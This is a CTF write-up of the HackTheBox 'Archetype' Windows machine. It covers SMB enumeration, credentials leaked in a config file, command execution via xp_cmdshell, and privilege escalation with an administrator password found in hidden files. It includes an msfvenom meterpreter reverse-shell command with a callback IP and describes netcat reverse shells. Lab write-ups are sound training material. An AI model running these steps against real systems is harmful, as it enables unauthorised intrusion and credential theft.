# HackTheBox-Archetype

## NMAP

```bash

PORT     STATE SERVICE      VERSION                                       
135/tcp  open  msrpc        Microsoft Windows RPC                         
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-09T05:37:36
| Not valid after:  2051-05-09T05:37:36
| MD5:   dd26 d0f2 bf23 57ec 693e 11af 7fe6 51f3
|_SHA-1: be4f 58af 20c9 c656 7ae4 4c6a bbfe 1ae2 6ce8 7f16
|_ssl-date: 2021-05-09T05:48:20+00:00; +18m07s from scanner time.
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


```

From the scan we scan see SMB service is running so we can check if we are allowed to access shares as `anonymous` user

## PORT 139/445 (SMB)

<img src="https://imgur.com/5tq1AwP.png"/>

Here we can see we can read `backups` share so let's do it 

<img src="https://imgur.com/vw3Kbqz.png"/>

Download the file using `get prod.dtsConfig`

On reading the file we can there's a password for `sql_svc` service account

<img src="https://i.imgur.com/YSfVB3T.png"/>

Let's verify it through `crackmapexec`

<img src="https://imgur.com/wn9GCJZ.png"/>

And it seems the credentials are valid, so I am going to be using `sqsh` which is an opensource interactive database shell

<img src="https://imgur.com/bs3ulYE.png"/>

Now to execute windows commands we are going to use `xp_cmdshell` which spawns a windows command shell . xp_cmdshell is an extended stored procedure provided by Microsoft and stored in the master database. So the whole command will be 
```
EXEC master ..xp_cmdshell 'whoami'
``` 
 Here `EXEC` is used to execute stored procedure on a database and stored procedures are kinda like functions in mysql /mssql.
 
 <img src="https://i.imgur.com/zPvVKue.png"/>
 
 Perfect now we need to what's our current location in file system so we may upload our payload and get a proper shell
 
 <img src="https://i.imgur.com/JV5Zop9.png"/>
 
 Right now we are in `system32` folder where we don't have permissions to read and write so we may need to save our payload in a directory where we are allowed to
 
 This looks the directory for the service account or user in this case now since he has his own directory 
 
 <img src="https://i.imgur.com/QG5bCsR.png"/>
 
 Generate a windows 64 bit metepreter payload
 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.220 LPORT=2222 -f exe > shell.exe
```

 <img src="https://imgur.com/Y8hX7IN.png"/>
 
 Now host this on local machine using python3 
 
 <img src="https://imgur.com/b5JLOFi.png"/>
 
 And download it like this 
 
 <img src="https://imgur.com/DTWyoFM.png"/>
 
But whenever I try to execute the payload it would get deleted so there's some schedule tasks or scripts running in the background so can't do it like this also I tried uploading a powershell script and executing but that was blocked as well

<img src="https://i.imgur.com/nX8cWTQ.png"/>

So the only option left was to upload a netcat executable for 64 bit version

<img src="https://imgur.com/qQfzyUh.png"/>

Then simply run the executable 

<img src="https://i.imgur.com/3rk7B9r.png"/>

Running `whoami /all` we can see privileges on the machine

<img src="https://i.imgur.com/SOP337d.png"/>

I tried to use `PrintSpoofer`exploit but it failed

<img src="https://imgur.com/4NLd4Lu.png"/>

At this point I took a hint for the escalation because everything was failing and it wasn't meant to be exploited like that so I was told to find password for `Administrator` account so I started to view hidden files with `dir /a`

<img src="https://i.imgur.com/YRaXS7d.png"/>

Since WinRM port is open we can remotely login using these credentials

<img src="https://imgur.com/e93MKLX.png"/>